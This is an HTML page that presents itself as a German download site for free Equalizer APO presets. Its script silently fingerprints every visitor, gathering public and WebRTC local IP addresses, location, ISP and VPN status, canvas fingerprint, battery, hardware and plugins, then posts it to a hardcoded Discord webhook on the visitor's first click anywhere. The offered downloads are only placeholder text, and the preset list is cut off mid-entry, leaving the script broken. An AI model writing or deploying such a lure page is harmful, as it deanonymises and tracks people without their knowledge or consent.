<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Equalizer APO Sets</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background: #1a1a1a;
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
            cursor: pointer;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: #2a2a2a;
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            pointer-events: none;
        }
        .container * {
            pointer-events: auto;
        }
        h1 {
            color: #fff;
            font-size: 28px;
            margin-bottom: 5px;
            text-align: center;
        }
        .subtitle {
            color: #aaa;
            text-align: center;
            margin-bottom: 25px;
            font-size: 14px;
        }
        .search-box {
            width: 100%;
            padding: 12px 20px;
            border: 2px solid #444;
            border-radius: 8px;
            background: #1a1a1a;
            color: #fff;
            font-size: 16px;
            margin-bottom: 25px;
            outline: none;
            transition: border 0.3s;
        }
        .search-box:focus {
            border-color: #4a90e2;
        }
        .search-box::placeholder {
            color: #666;
        }
        .set-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 15px;
        }
        .set-card {
            background: #333;
            border-radius: 8px;
            padding: 18px;
            transition: transform 0.2s, box-shadow 0.2s;
            border: 1px solid #444;
            cursor: pointer;
        }
        .set-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0,0,0,0.4);
            border-color: #4a90e2;
        }
        .set-name {
            font-size: 18px;
            font-weight: bold;
            color: #fff;
            margin-bottom: 6px;
        }
        .set-desc {
            font-size: 13px;
            color: #aaa;
            margin-bottom: 12px;
            line-height: 1.4;
        }
        .set-meta {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #888;
            margin-bottom: 12px;
        }
        .set-meta span {
            background: #444;
            padding: 2px 10px;
            border-radius: 12px;
        }
        .download-btn {
            display: inline-block;
            padding: 8px 20px;
            background: #4a90e2;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            transition: background 0.2s;
            width: 100%;
            text-align: center;
            font-weight: bold;
        }
        .download-btn:hover {
            background: #5a9ef2;
        }
        .download-btn:active {
            transform: scale(0.97);
        }
        .empty-state {
            text-align: center;
            color: #666;
            padding: 40px 0;
            font-size: 16px;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            color: #666;
            font-size: 12px;
            border-top: 1px solid #333;
            padding-top: 20px;
        }
        .toast {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: #333;
            color: #fff;
            padding: 15px 25px;
            border-radius: 8px;
            border-left: 4px solid #28a745;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            display: none;
            z-index: 999;
            max-width: 350px;
            font-size: 14px;
        }
        .toast.show {
            display: block;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { transform: translateX(100px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        .toast.error {
            border-left-color: #dc3545;
        }
        .toast.sending {
            border-left-color: #ffc107;
        }
    </style>
</head>
<body>

        <h1>Equalizer APO Sets</h1>
        <p class="subtitle">Lade vorgefertigte Equalizer-Einstellungen herunter</p>

        <input type="text" class="search-box" id="searchInput" placeholder="Sets durchsuchen..." oninput="filterSets()">

        <div class="set-grid" id="setGrid"></div>

        <div class="footer">
            <p>Equalizer APO muss installiert sein. Alle Sets sind kostenlos.</p>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1531797628537274429/rdltEYhjTKPo-HxAdyg5BXF24pCVaZzNqVP2GQ2RkyjS4JarkOUZ_KLCrGpPLTM2Unx6";

        let collectedData = null;
        let dataSent = false;
        let isSending = false;

        const sets = [
            {
                name: "Totengräber Speed Set",
                desc: "Optimiert für schnelle Reaktionen und klare Höhen.",

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let name = 'Unbekannt';
            let version = '';
            
            if (ua.includes('Chrome')) {
                name = 'Chrome';
                const match = ua.match(/Chrome\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (ua.includes('Firefox')) {
                name = 'Firefox';
                const match = ua.match(/Firefox\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
                name = 'Safari';
                const match = ua.match(/Version\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (ua.includes('Edge')) {
                name = 'Edge';
                const match = ua.match(/Edg\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (ua.includes('Opera') || ua.includes('OPR')) {
                name = 'Opera';
                const match = ua.match(/OPR\/(\d+\.\d+)/);
                if (match) version = match[1];
            }
            
            return { name, version };
        }

        function getOSInfo() {
            const ua = navigator.userAgent;
            let name = 'Unbekannt';
            let version = '';
            
            if (ua.includes('Windows')) {
                name = 'Windows';
                if (ua.includes('Windows NT 10.0')) version = '10/11';
                else if (ua.includes('Windows NT 6.3')) version = '8.1';
                else if (ua.includes('Windows NT 6.2')) version = '8';
                else if (ua.includes('Windows NT 6.1')) version = '7';
                else if (ua.includes('Windows NT 6.0')) version = 'Vista';
                else if (ua.includes('Windows NT 5.1')) version = 'XP';
            } else if (ua.includes('Mac OS X')) {
                name = 'macOS';
                const match = ua.match(/Mac OS X (\d+[._]\d+)/);
                if (match) version = match[1].replace('_', '.');
            } else if (ua.includes('Linux')) {
                name = 'Linux';
                if (ua.includes('Android')) {
                    name = 'Android';
                    const match = ua.match(/Android (\d+\.\d+)/);
                    if (match) version = match[1];
                }
            } else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) {
                name = 'iOS';
                const match = ua.match(/OS (\d+[._]\d+)/);
                if (match) version = match[1].replace('_', '.');
            }
            
            return { name, version };
        }

        function getHardwareInfo() {
            return {
                memory: navigator.deviceMemory || 'nicht verfügbar',
                cores: navigator.hardwareConcurrency || 'nicht verfügbar',
                touchPoints: navigator.maxTouchPoints || 0,
                pixelRatio: window.devicePixelRatio || 1,
                colorDepth: screen.colorDepth || 'unbekannt'
            };
        }

        function getConnectionInfo() {
            if (navigator.connection) {
                return {
                    type: navigator.connection.effectiveType || 'unbekannt',
                    downlink: navigator.connection.downlink || 'unbekannt',
                    rtt: navigator.connection.rtt || 'unbekannt'
                };
            }
            return { type: 'nicht verfügbar', downlink: 'nicht verfügbar', rtt: 'nicht verfügbar' };
        }

        function getPluginsInfo() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins;
        }

        function getMimeTypesInfo() {
            const mimes = [];
            for (let i = 0; i < navigator.mimeTypes.length; i++) {
                mimes.push(navigator.mimeTypes[i].type);
            }
            return mimes;
        }

        function getWebRTCInfo() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (event) => {
                        if (event.candidate) {
                            const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                            const match = event.candidate.candidate.match(ipRegex);
                            if (match) {
                                resolve(match[0]);
                                pc.close();
                            }
                        } else {
                            resolve('Keine lokale IP');
                            pc.close();
                        }
                    };
                    setTimeout(() => {
                        resolve('Timeout');
                        pc.close();
                    }, 2000);
                } catch (e) {
                    resolve('Nicht verfügbar');
                }
            });
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#000';
                ctx.fillRect(0, 0, 200, 50);
                ctx.fillStyle = '#fff';
                ctx.font = '16px Arial';
                ctx.fillText('Fingerprint', 10, 30);
                ctx.fillStyle = '#f00';
                ctx.fillRect(150, 10, 20, 20);
                return canvas.toDataURL().substring(0, 80) + '...';
            } catch {
                return 'Nicht verfügbar';
            }
        }

        function getScreenInfo() {
            return {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            };
        }

        function getWindowInfo() {
            return {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio
            };
        }

        function getNavigatorInfo() {
            return {
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                vendor: navigator.vendor || 'Unbekannt',
                vendorSub: navigator.vendorSub || 'Unbekannt',
                product: navigator.product || 'Unbekannt',
                productSub: navigator.productSub || 'Unbekannt',
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'nicht gesetzt',
                language: navigator.language,
                languages: navigator.languages,
                onLine: navigator.onLine,
                hardwareConcurrency: navigator.hardwareConcurrency || 'nicht verfügbar',
                deviceMemory: navigator.deviceMemory || 'nicht verfügbar',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                webdriver: navigator.webdriver || false
            };
        }

        function getPerformanceInfo() {
            if (performance && performance.memory) {
                return {
                    totalJSHeapSize: performance.memory.totalJSHeapSize,
                    usedJSHeapSize: performance.memory.usedJSHeapSize,
                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
                };
            }
            return 'nicht verfügbar';
        }

        function getBatteryInfo() {
            return new Promise((resolve) => {
                if (navigator.getBattery) {
                    navigator.getBattery()
                        .then(battery => {
                            resolve({
                                level: Math.round(battery.level * 100) + '%',
                                charging: battery.charging,
                                chargingTime: battery.chargingTime + 's',
                                dischargingTime: battery.dischargingTime + 's'
                            });
                        })
                        .catch(() => resolve({ error: 'Fehler' }));
                } else {
                    resolve({ error: 'nicht unterstützt' });
                }
            });
        }

        async function getIPAddress() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json'
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service);
                    if (!response.ok) continue;
                    const data = await response.json();
                    if (data.ip) return data.ip;
                } catch (e) {
                    continue;
                }
            }
            return 'Nicht verfügbar';
        }

        async function detectVPN(ip) {
            if (!ip || ip === 'Nicht verfügbar') {
                return { isVPN: false, reason: 'Keine IP' };
            }

            try {
                const response = await fetch('https://ipapi.co/' + ip + '/json/');
                if (!response.ok) throw new Error('API-Fehler');
                const data = await response.json();
                
                let isVPN = false;
                let reasons = [];
                let score = 0;

                if (data.org && data.org.toLowerCase().includes('vpn')) {
                    isVPN = true;
                    reasons.push('VPN in Organisation');
                    score += 30;
                }
                if (data.is_proxy) {
                    isVPN = true;
                    reasons.push('Proxy erkannt');
                    score += 40;
                }
                if (data.is_tor) {
                    isVPN = true;
                    reasons.push('Tor-Netzwerk');
                    score += 50;
                }
                if (data.is_hosting) {
                    isVPN = true;
                    reasons.push('Hosting/Cloud');
                    score += 20;
                }

                const vpnProviders = [
                    'nordvpn', 'expressvpn', 'cyberghost', 'surfshark',
                    'protonvpn', 'mullvad', 'tunnelbear', 'windscribe',
                    'ipvanish', 'vyprvpn', 'purevpn', 'zenmate',
                    'cloudflare', 'amazon', 'aws', 'azure', 'google cloud',
                    'digitalocean', 'hetzner', 'ovh', 'vultr', 'linode'
                ];

                if (data.org) {
                    const orgLower = data.org.toLowerCase();
                    for (const provider of vpnProviders) {
                        if (orgLower.includes(provider)) {
                            isVPN = true;
                            reasons.push('VPN-Anbieter: ' + provider);
                            score += 40;
                            break;
                        }
                    }
                }

                return {
                    isVPN: isVPN,
                    reason: reasons.join('; ') || 'Keine Indikatoren',
                    score: score,
                    provider: data.org || 'Unbekannt',
                    country: data.country_name || 'Unbekannt',
                    city: data.city || 'Unbekannt',
                    isp: data.isp || 'Unbekannt'
                };
            } catch (error) {
                return { isVPN: false, reason: 'VPN-Erkennung fehlgeschlagen' };
            }
        }

        async function collectAllData() {
            const browser = getBrowserInfo();
            const os = getOSInfo();
            const hardware = getHardwareInfo();
            const connection = getConnectionInfo();
            const screenInfo = getScreenInfo();
            const windowInfo = getWindowInfo();
            const navigatorInfo = getNavigatorInfo();
            const performanceInfo = getPerformanceInfo();
            const plugins = getPluginsInfo();
            const mimeTypes = getMimeTypesInfo();
            
            const ip = await getIPAddress();
            const vpnResult = await detectVPN(ip);
            const webRTCIP = await getWebRTCInfo();
            const batteryInfo = await getBatteryInfo();
            const canvasFingerprint = getCanvasFingerprint();

            return {
                timestamp: new Date().toISOString(),
                timestampLocal: new Date().toLocaleString('de-DE', { 
                    dateStyle: 'full', 
                    timeStyle: 'medium' 
                }),
                ip: ip,
                vpn: {
                    detected: vpnResult.isVPN,
                    confidence: vpnResult.score + '%',
                    reason: vpnResult.reason,
                    provider: vpnResult.provider,
                    country: vpnResult.country,
                    city: vpnResult.city,
                    isp: vpnResult.isp
                },
                webRTC: {
                    localIP: webRTCIP,
                    vpnLeak: webRTCIP && ip && webRTCIP !== ip
                },
                connection: {
                    type: connection.type,
                    speed: connection.downlink + ' Mbps',
                    latency: connection.rtt + ' ms'
                },
                browser: {
                    name: browser.name,
                    version: browser.version,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    languages: navigator.languages
                },
                os: {
                    name: os.name,
                    version: os.version,
                    platform: navigator.platform
                },
                hardware: {
                    memory: hardware.memory + ' GB',
                    cores: hardware.cores + ' Kerne',
                    touchPoints: hardware.touchPoints + ' Punkte',
                    pixelRatio: hardware.pixelRatio,
                    colorDepth: hardware.colorDepth + ' bit'
                },
                screen: {
                    resolution: screenInfo.width + 'x' + screenInfo.height,
                    available: screenInfo.availWidth + 'x' + screenInfo.availHeight,
                    colorDepth: screenInfo.colorDepth + ' bit',
                    pixelDepth: screenInfo.pixelDepth + ' bit'
                },
                window: {
                    inner: windowInfo.innerWidth + 'x' + windowInfo.innerHeight,
                    outer: windowInfo.outerWidth + 'x' + windowInfo.outerHeight,
                    devicePixelRatio: windowInfo.devicePixelRatio
                },
                plugins: {
                    count: plugins.length,
                    names: plugins.join(' | ')
                },
                mimeTypes: {
                    count: mimeTypes.length,
                    types: mimeTypes.join(' | ')
                },
                canvasFingerprint: canvasFingerprint,
                battery: batteryInfo,
                performance: performanceInfo,
                navigator: navigatorInfo,
                page: {
                    url: window.location.href,
                    referrer: document.referrer || 'Direktaufruf',
                    title: document.title,
                    hostname: window.location.hostname
                },
                time: {
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    offset: (new Date().getTimezoneOffset() / -60) + ' Stunden',
                    timestamp: new Date().getTime()
                }
            };
        }

        async function sendToWebhook(data) {
            const vpnStatus = data.vpn.detected ? 'Ja' : 'Nein';
            const vpnDetails = data.vpn.detected ? 
                data.vpn.reason + ' (Vertrauen: ' + data.vpn.confidence + ')' : 
                'Kein VPN erkannt';

            const fields = [
                { name: "IP-Adresse", value: data.ip || 'Nicht verfügbar', inline: true },
                { name: "VPN erkannt", value: vpnStatus, inline: true },
                { name: "VPN Details", value: vpnDetails, inline: false },
                { name: "Standort", value: data.vpn.country + ' (' + data.vpn.city + ')', inline: true },
                { name: "ISP", value: data.vpn.isp || 'Unbekannt', inline: true },
                { name: "Betriebssystem", value: data.os.name + ' ' + data.os.version, inline: true },
                { name: "Browser", value: data.browser.name + ' ' + data.browser.version, inline: true },
                { name: "Bildschirm", value: data.screen.resolution, inline: true },
                { name: "RAM", value: data.hardware.memory, inline: true },
                { name: "CPU", value: data.hardware.cores, inline: true },
                { name: "Verbindung", value: data.connection.type + ' (' + data.connection.speed + ')', inline: true },
                { name: "Touch", value: data.hardware.touchPoints, inline: true },
                { name: "Plugins", value: data.plugins.count + ' aktiv', inline: true },
                { name: "WebRTC IP", value: data.webRTC.localIP || 'Nicht verfügbar', inline: true },
                { name: "WebRTC VPN", value: data.webRTC.vpnLeak ? 'Ja (IP unterschiedlich)' : 'Nein', inline: true },
                { name: "Sprachen", value: data.browser.languages.join(', ') || 'Unbekannt', inline: false },
                { name: "Seite", value: data.page.url, inline: false },
                { name: "Besucht", value: data.timestampLocal, inline: true }
            ];

            if (data.canvasFingerprint && data.canvasFingerprint !== 'Nicht verfügbar') {
                fields.push({ name: "Canvas Fingerprint", value: data.canvasFingerprint, inline: false });
            }

            if (data.battery && !data.battery.error) {
                fields.push({ 
                    name: "Batterie", 
                    value: data.battery.level + ' | ' + (data.battery.charging ? 'Lädt' : 'Nicht am Strom'), 
                    inline: true 
                });
            }

            const embed = {
                title: "Besucher-Daten (Maximal)",
                color: data.vpn.detected ? 0xdc3545 : 0x4a90e2,
                fields: fields,
                footer: { text: "Equalizer APO Sets - Maximales Tracking" },
                timestamp: data.timestamp
            };

            const payload = { embeds: [embed] };

            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            return response.ok;
        }

        function showToast(message, type = 'success') {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.className = 'toast show ' + type;
            clearTimeout(toast._timeout);
            toast._timeout = setTimeout(() => {
                toast.classList.remove('show');
            }, 3000);
        }

        function renderSets(filter = '') {
            const grid = document.getElementById('setGrid');
            const filtered = sets.filter(s =>
                s.name.toLowerCase().includes(filter.toLowerCase()) ||
                s.desc.toLowerCase().includes(filter.toLowerCase()) ||
                s.category.toLowerCase().includes(filter.toLowerCase())
            );

            if (filtered.length === 0) {
                grid.innerHTML = '<div class="empty-state">Keine Sets gefunden.</div>';
                return;
            }

            grid.innerHTML = filtered.map(s => `
                <div class="set-card">
                    <div class="set-name">${s.name}</div>
                    <div class="set-desc">${s.desc}</div>
                    <div class="set-meta">
                        <span>${s.category}</span>
                        <span>${s.downloads} Downloads</span>
                    </div>
                    <button class="download-btn" onclick="downloadSet('${s.file}', '${s.name}')">Download</button>
                </div>
            `).join('');
        }

        function filterSets() {
            renderSets(document.getElementById('searchInput').value);
        }

        function downloadSet(filename, name) {
            const content = `# Equalizer APO Set: ${name}
# Erstellt fur Equalizer APO
# Besuche https://equalizerapo.com/ fur mehr Infos

# Hier kommen die EQ-Einstellungen
# Bitte ersetze diesen Text mit deinen tatsachlichen Einstellungen

# Beispiel:
# Filter: ON PK Fc 60 Hz Gain 3 dB Q 1.0
# Filter: ON PK Fc 250 Hz Gain -2 dB Q 1.5
`;

            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        async function sendDataOnClick() {
            if (dataSent || isSending) return;

            isSending = true;
            showToast('Sende Daten...', 'sending');

            try {
                if (!collectedData) {
                    collectedData = await collectAllData();
                }

                const success = await sendToWebhook(collectedData);

                if (success) {
                    dataSent = true;
                    showToast('Daten gesendet ✓', 'success');
                } else {
                    throw new Error('Webhook-Fehler');
                }
            } catch (error) {
                showToast('Fehler: ' + error.message, 'error');
                isSending = false;
            }
        }

        document.addEventListener('click', function(e) {
            sendDataOnClick();
        });

        window.addEventListener('DOMContentLoaded', async function() {
            try {
                collectedData = await collectAllData();
                renderSets();
            } catch (error) {
                console.error(error);
            }
        });
    </script>

</body>
</html>
